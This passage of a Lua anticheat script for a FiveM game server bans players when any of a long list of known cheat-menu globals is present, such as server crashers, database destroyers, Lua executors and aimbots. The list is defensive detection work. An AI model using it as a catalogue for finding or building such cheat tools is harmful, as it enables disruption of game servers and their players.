        elseif dexMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MaestroEra ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif HamHaxia.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Ham.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif HoaxMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Biznes.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FendinXMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FendinX.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AlphaV.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Deer.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif NyPremium.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif lIlIllIlI.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif OnionUI.CreateUI ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif qJtbGTz5y8ZmqcAg.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LuxUI.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FlexSkazaMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif falcon.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif topMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif JokerMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif rootMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif CKgang.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif CKgang.Button2 ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif DynnoFamily.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif redMENU.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif b00mMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FXMenu.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif DFefwtRE.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FFX.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif PoliniFuncsUI.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AlwaysKaffa.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AKTeam.CreateMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif IlIlIlIlIlI ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LDOWJDWDdddwdwdad ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif LiLLL ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif forcetick ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MagnetoModeThread ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Oneshot ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif recoilcontrolsystem ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AirstrikeWaypoint ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AirstrikePlayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif SpawnObjOnPlayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AirstrikeThread ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif RandomClothes ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Fakesniper ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ForceMod ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif SelfRagdoll ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif TSE ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif RainbowVeh ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MaxOut ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif mazebank ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif sandy ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif SelfRagdollThread ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif KillYourselfThread ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif chatspam ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif rainbowTint ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif crosshair3 ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif explodevehicles ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif gcphonedestroy ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif pBNAnrVJeN ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif JurekOwsiakUI ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif EfPWELDSBC ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif bTaXXysBSa ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif MgKGsljioI ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif vqKHLqqeTZ ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif hRPeaeosFd ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif DCgutDvdii ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif pdocisaduafuGFNAEgg ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif wybuchall ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ililililil ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif HoaxMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif nukeserver ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif nuke ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif FirePlayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ShootPlayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif NertigelFunc ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif essa ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif esxdestroyv2 ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif esxdestroy ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif esp ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif destroyvehicles ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif banallusers ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif freezeall ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif servercrasher ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif teleportToNearestVehicle ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AddTeleportMenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AmbulancePlayers ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Aimbot ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif RapeAllFunc ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif rape ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif explosiveAmmo ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif blowall ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif vehicleGun ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif CrashPlayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif Macias ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif PrintTable ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif EconomyDestroyer2 ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif bananapartyall ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif AmbulancePlayers ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif cageplayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif rapeplayer ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif bananaparty ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif destroyserverdb ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif givemesomemoney ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif servercmdbomber ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif luaExecutor ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif alkomenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif ToggleBlips ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif infinity ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        elseif luxmenu ~= nil then
            TriggerEvent("banCheater", source,"🛡️ Modder ")
            M1()
        end
    end
end)
-------------------------------------
--C:\ CONSOLE INFO

print("^4M1^0")
print("^4M1 Successfully loaded^0")
print("^4Developed by !!!! Mikko#2913^0")
-------------------------------------

-------
--M1--
-------